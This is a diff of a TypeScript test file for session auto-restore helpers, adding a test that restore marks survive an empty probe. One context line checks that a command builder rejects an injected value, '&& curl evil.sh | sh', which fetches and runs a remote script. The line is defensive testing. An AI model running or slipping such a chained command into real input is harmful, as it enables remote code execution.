@@ -4,6 +4,7 @@ import {
     resolveAutoRestoreConfig,
     autoRestoreSummary,
     autoResumeCommand,
+    markAutoRestored,
     AUTO_RESTORE_DEFAULTS,
     AUTO_RESTORE_HARD_MAX,
     type AutoRestoreCandidate,
@@ -124,6 +125,22 @@ describe('autoResumeCommand', () => {
         expect(autoResumeCommand(UUID)).toBe(`claude --resume ${UUID}`);
         expect(() => autoResumeCommand('nope')).toThrow();
         expect(() => autoResumeCommand(`${UUID} && curl evil.sh | sh`)).toThrow();
+    });
+});
+
+describe('markAutoRestored', () => {
+    it('survives a transient empty probe and overlays the next good list', () => {
+        const marks = new Map([['restored', NOW]]);
+
+        expect(markAutoRestored([], marks)).toEqual([]);
+        expect(marks.get('restored')).toBe(NOW);
+        expect(markAutoRestored([
+            { id: 'restored', title: 'workspace' },
+            { id: 'ordinary', title: 'shell' },
+        ], marks)).toEqual([
+            { id: 'restored', title: 'workspace', restoredAt: NOW },
+            { id: 'ordinary', title: 'shell' },
+        ]);
     });
 });
 
